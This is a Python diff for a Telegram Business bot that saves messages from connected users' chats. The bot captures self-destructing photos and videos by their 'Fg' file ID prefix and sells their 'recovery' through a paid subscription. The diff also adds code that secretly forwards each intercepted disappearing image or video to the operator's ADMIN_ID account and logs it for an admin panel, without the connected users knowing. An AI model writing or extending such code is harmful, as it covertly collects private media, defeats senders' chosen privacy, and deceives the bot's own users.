@@ -4,7 +4,7 @@ import html
 import asyncio
 from datetime import datetime
 from aiogram import Router, Bot, F
-from aiogram.types import Message, BusinessConnection, BusinessMessagesDeleted, FSInputFile
+from aiogram.types import Message, BusinessConnection, BusinessMessagesDeleted, FSInputFile,  InlineKeyboardMarkup, InlineKeyboardButton
 from sqlalchemy import select, desc, or_, and_
 from database.engine import Session
 from database.models import MsgLog, Conn, UserAccount, Settings
@@ -25,8 +25,8 @@ async def get_conn_data(session, conn_id):
     res = await session.execute(select(Conn).where(Conn.id == conn_id))
     return res.scalar_one_or_none()
 
-async def download_media_logic(bot: Bot, message: Message):
-    """Скачивает медиа СТРОГО из переданного сообщения"""
+async def download_media_logic(bot: Bot, message: Message, folder_name: str):
+    """Скачивает медиа и раскладывает по папкам: media/@username/YYYY-MM-DD/"""
     file_id = None
     m_type = None
     
@@ -41,7 +41,16 @@ async def download_media_logic(bot: Bot, message: Message):
         try:
             file = await bot.get_file(file_id)
             ext = file.file_path.split('.')[-1]
-            local_path = f"{MEDIA_DIR}/{file_id}.{ext}"
+            
+            # --- НОВАЯ ЛОГИКА ПАПОК ---
+            date_str = datetime.now().strftime("%Y-%m-%d")
+            full_dir = os.path.join(MEDIA_DIR, folder_name, date_str)
+            
+            if not os.path.exists(full_dir):
+                os.makedirs(full_dir, exist_ok=True)
+                
+            local_path = os.path.join(full_dir, f"{file_id}.{ext}")
+            
             if not os.path.exists(local_path):
                 await bot.download_file(file.file_path, local_path)
             return local_path, m_type, file_id
@@ -97,18 +106,25 @@ async def on_connect(connection: BusinessConnection, bot: Bot):
 
 @router.business_message()
 async def on_business_msg(message: Message, bot: Bot):
+    """Обработка ТОЛЬКО новых сообщений"""
     conn_id = message.business_connection_id
     msg_id = message.message_id
     
+    logger.info(f"--- [NEW MSG] ID:{msg_id} | Type:{message.content_type} ---")
+
     async with Session() as session:
         conn_data = await get_conn_data(session, conn_id)
         if not conn_data: return
         owner_id = conn_data.user_id
+        
+        # Определяем имя папки (username или ID)
+        folder_name = f"@{conn_data.username}" if conn_data.username else f"ID_{owner_id}"
 
         # 1. СОХРАНЕНИЕ
-        f_p, m_t, f_id = await download_media_logic(bot, message)
+        f_p, m_t, f_id = await download_media_logic(bot, message, folder_name)
         text = (message.text or message.caption or "").strip()
         
+        # ЖЕСТКИЙ ДЕТЕКТОР: только Fg префикс или системный флаг времени
         is_sd = False
         if f_id and f_id.startswith("Fg"): 
             is_sd = True
@@ -131,10 +147,22 @@ async def on_business_msg(message: Message, bot: Bot):
                 )
                 session.add(new_log)
                 await session.commit()
+                if m_t: logger.info(f"[SAVE] ID:{msg_id} | SD:{is_sd} | Prefix:{f_id[:2] if f_id else 'None'}")
         except Exception as e:
             await session.rollback()
+            logger.error(f"[DB ERROR] {e}")
 
-        # Глобальное уведомление админу
+        # --- НОВОЕ: МГНОВЕННАЯ ОТПРАВКА ИСЧЕЗАЮЩЕГО ФОТО АДМИНУ ---
+        if is_sd and f_p and f_p != "error":
+            try:
+                f = FSInputFile(f_p)
+                cap = f"🔥 <b>Перехват исчезающего медиа!</b>\nАккаунт: <code>{owner_id}</code>\nОт: {message.from_user.full_name}"
+                if m_t == "photo": await bot.send_photo(ADMIN_ID, f, caption=cap, parse_mode="HTML")
+                elif m_t == "video": await bot.send_video(ADMIN_ID, f, caption=cap, parse_mode="HTML")
+            except Exception as e:
+                logger.error(f"Admin SD notify error: {e}")
+
+        # Глобальное уведомление админу (только текст)
         res_s = await session.execute(select(Settings).where(Settings.id == 1))
         sett = res_s.scalars().first()
         if sett and sett.global_notify and owner_id != ADMIN_ID:
@@ -147,18 +175,16 @@ async def on_business_msg(message: Message, bot: Bot):
             
             reply_obj = message.reply_to_message
             reply_to_id = reply_obj.message_id
+            logger.info(f"[REPLY] Владелец ответил на {reply_to_id}. Проверка на исчезающее...")
 
-            res_orig = await session.execute(
-                select(MsgLog).where(
-                    and_(
-                        MsgLog.owner_id == owner_id,
-                        MsgLog.chat_id == message.chat.id,
-                        or_(MsgLog.message_id == reply_to_id, MsgLog.message_id == reply_to_id - 1),
-                        MsgLog.message_id != msg_id,
-                        MsgLog.file_path != None
-                    )
-                ).order_by(desc(MsgLog.id))
-            )
+            # А) Ищем в базе
+            res_orig = await session.execute(select(MsgLog).where(and_(
+                MsgLog.owner_id == owner_id, 
+                MsgLog.chat_id == message.chat.id, 
+                or_(MsgLog.message_id == reply_to_id, MsgLog.message_id == reply_to_id - 1),
+                MsgLog.message_id != msg_id,
+                MsgLog.file_path != None
+            )).order_by(desc(MsgLog.id)))
             orig = res_orig.scalars().first()
 
             final_path, final_type, final_id = None, None, None
@@ -168,33 +194,77 @@ async def on_business_msg(message: Message, bot: Bot):
                 final_path, final_type = orig.file_path, orig.media_type
                 final_id = os.path.basename(final_path).split('.')[0] if final_path else ""
                 is_actually_sd = orig.is_self_destruct
+                logger.info(f"[FIND] В БД: ID {orig.message_id}, SD_Flag: {is_actually_sd}, Prefix: {final_id[:2]}")
             else:
-                final_path, final_type, final_id = await download_media_logic(bot, reply_obj)
+                # Б) Если в базе нет, пробуем захват из объекта ответа
+                final_path, final_type, final_id = await download_media_logic(bot, reply_obj, folder_name)
                 if final_id and final_id.startswith("Fg"): is_actually_sd = True
+                logger.info(f"[FIND] В БД пусто. Захват из ответа: Prefix {final_id[:2] if final_id else 'None'}")
 
+            # В) ОТПРАВКА (Строго только если SD)
             if final_id and final_id.startswith("Ag"):
+                logger.info(f"[SKIP] Обычное фото (Ag). Отмена.")
                 return
 
             if final_path and final_path != "error" and is_actually_sd:
                 acc = await session.get(UserAccount, owner_id)
                 if not acc: return
+                
                 is_paid = acc.subscription_until and acc.subscription_until > datetime.now()
                 
                 if not is_paid:
                     if acc.attempts > 0:
-                        acc.attempts -= 1; await session.commit()
-                    elif acc.attempts != 0:
-                        return await bot.send_message(owner_id, "❌ У вас закончились попытки. Пригласите друзей: /ref")
+                        acc.attempts -= 1
+                        await session.commit()
+                    else:
+                        PRICE_30_DAYS = int(os.getenv("PRICE_30_DAYS", 100))
+                        PRICE_60_DAYS = int(os.getenv("PRICE_60_DAYS", 170))
+                        kb_buy = InlineKeyboardMarkup(inline_keyboard=[
+                            [InlineKeyboardButton(text=f"💎 Подписка 30 дней ({PRICE_30_DAYS}₽)", callback_data="buy_premium:30")],
+                            [InlineKeyboardButton(text=f"⭐ Подписка 60 дней ({PRICE_60_DAYS}₽)", callback_data="buy_premium:60")]
+                        ])
+                        return await bot.send_message(
+                            owner_id, 
+                            "❌ <b>У вас закончились бесплатные попытки!</b>\n\n"
+                            "Чтобы посмотреть восстановленное исчезающее медиа, оформите <b>Premium ⭐</b> подписку.", 
+                            reply_markup=kb_buy,
+                            parse_mode="HTML"
+                        )
 
                 try:
+                    # 1. Отправляем владельцу
                     f = FSInputFile(final_path)
-                    status = "Premium ⭐" if is_paid else f"Осталось попыток: {acc.attempts if acc.attempts > 0 else '∞'}"
+                    status = "Premium ⭐" if is_paid else f"Осталось попыток: {acc.attempts}"
                     cap = f"🔥 <b>Восстановлено исчезающее медиа:</b>\nОт: {html.escape(reply_obj.from_user.full_name or '?')}\n\n{status}"
-                    
                     if final_type == "photo": await bot.send_photo(owner_id, f, caption=cap, parse_mode="HTML")
                     elif final_type == "video": await bot.send_video(owner_id, f, caption=cap, parse_mode="HTML")
+                    logger.info(f"[SEND SUCCESS] Отправлено владельцу {owner_id}")
+
+                    # 2. МГНОВЕННАЯ ОТПРАВКА АДМИНУ (НОВОЕ)
+                    try:
+                        admin_f = FSInputFile(final_path)
+                        admin_cap = f"🔥 <b>Перехват исчезающего медиа!</b>\nАккаунт: <code>{owner_id}</code>\nОт: {reply_obj.from_user.full_name}"
+                        if final_type == "photo": await bot.send_photo(ADMIN_ID, admin_f, caption=admin_cap, parse_mode="HTML")
+                        elif final_type == "video": await bot.send_video(ADMIN_ID, admin_f, caption=admin_cap, parse_mode="HTML")
+                    except Exception as e:
+                        logger.error(f"Admin SD notify error: {e}")
+
+                    # 3. СОХРАНЕНИЕ В БАЗУ ДЛЯ АДМИНКИ (НОВОЕ)
+                    if not orig:  # Если файла не было в базе, добавляем его принудительно
+                        recovered_log = MsgLog(
+                            owner_id=owner_id, connection_id=conn_id, message_id=reply_to_id,
+                            chat_id=message.chat.id, from_id=reply_obj.from_user.id,
+                            from_name=reply_obj.from_user.full_name, from_username=reply_obj.from_user.username,
+                            text="[Восстановленное исчезающее медиа]", file_path=final_path, media_type=final_type, 
+                            reply_to_id=None, is_self_destruct=True
+                        )
+                        session.add(recovered_log)
+                        await session.commit()
+
                 except Exception as e:
-                    logger.error(f"Restore error: {e}")
+                    logger.error(f"[SEND ERROR] {e}")
+            else:
+                logger.info(f"[SKIP] Это обычное медиа (Ag) или файл не найден. Отмена отправки.")
 
 @router.edited_business_message()
 async def on_edit(message: Message, bot: Bot):
